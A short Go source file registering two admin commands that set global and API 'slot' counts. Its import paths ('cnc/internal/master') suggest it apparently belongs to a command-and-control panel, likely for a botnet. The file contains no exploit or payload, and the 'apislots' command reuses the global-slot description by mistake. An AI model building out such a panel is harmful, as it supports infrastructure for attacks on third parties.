package commands

import (
	"cnc/internal"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"slots", "globalslots"},
		Roles:       []string{"admin"},
		Description: "Attempts to set the global slot count.",
		Arguments: []*command.Argument{
			command.NewArgument("slots", nil, command.ArgumentInteger, true),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			slotCount, err := ctx.Integer("slots")
			if err != nil {
				return err
			}

			internal.GlobalSlots = slotCount
			return session.Notification("There are now %d global slots available.", slotCount)
		}},
	)

	command.Create(&command.Command{
		Aliases:     []string{"apislots"},
		Roles:       []string{"admin"},
		Description: "Attempts to set the global slot count.",
		Arguments: []*command.Argument{
			command.NewArgument("slots", nil, command.ArgumentInteger, true),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			slotCount, err := ctx.Integer("slots")
			if err != nil {
				return err
			}

			internal.ApiSlots = slotCount
			return session.Notification("There are now %d global slots available.", slotCount)
		}},
	)
}
